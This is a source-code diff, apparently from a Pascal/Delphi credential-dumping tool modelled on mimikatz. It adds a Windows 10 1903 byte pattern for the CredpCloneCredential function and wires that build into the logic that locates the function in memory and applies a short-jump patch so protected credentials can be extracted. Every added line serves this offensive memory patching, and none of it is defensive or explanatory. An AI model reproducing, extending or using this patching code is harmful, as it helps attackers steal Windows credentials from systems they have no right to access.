@@ -331,6 +331,7 @@ const
   PTRN_WN10_1703_CredpCloneCredential:array [0..7] of byte =($45, $8b, $e6, $41, $83, $e4, $01, $75);
   PTRN_WN10_1803_CredpCloneCredential:array [0..7] of byte =($45, $8b, $fe, $41, $83, $e7, $01, $75);
   PTRN_WN10_1809_CredpCloneCredential:array [0..8] of byte =($45, $8b, $e6, $41, $83, $e4, $01, $0f, $84);
+  PTRN_WN10_1903_CredpCloneCredential:array [0..8] of byte =($45, $8B, $E6, $41, $83, $E4, $01, $0F, $84);
   PTRN_WN10_2004_CredpCloneCredential:array [0..8] of byte =($45, $8b, $e6, $41, $83, $e4, $01, $0f, $84);
   //
   PTRN_WN60_CredpCloneCredential_x86:array [0..7] of byte =($89, $4d, $18, $83, $65, $18, $01, $75);
@@ -388,6 +389,12 @@ begin
          CopyMemory (@pattern[0],@PTRN_WN10_1809_CredpCloneCredential[0],length(PTRN_WN10_1809_CredpCloneCredential));
          offset:=7;
          end;
+     if (pos('-1903',winver)>0) then
+         begin
+         setlength(pattern,length(PTRN_WN10_1903_CredpCloneCredential));
+         CopyMemory (@pattern[0],@PTRN_WN10_1903_CredpCloneCredential[0],length(PTRN_WN10_1903_CredpCloneCredential));
+         offset:=7;
+         end;
      if (pos('-2004',winver)>0) then
          begin
          setlength(pattern,length(PTRN_WN10_2004_CredpCloneCredential));
@@ -431,7 +438,7 @@ begin
   if (lowercase(osarch)='amd64') then
      begin
      //nothing needed here
-     if (pos('-1809',winver)>0) or (pos('-2004',winver)>0) then
+     if (pos('-1809',winver)>0) or (pos('-1903',winver)>0) or (pos('-2004',winver)>0) then
         begin
         setlength(after,sizeof(PATC_WN64_CredpCloneCredentialJmpShort));
         setlength(backup,sizeof(PATC_WN64_CredpCloneCredentialJmpShort));
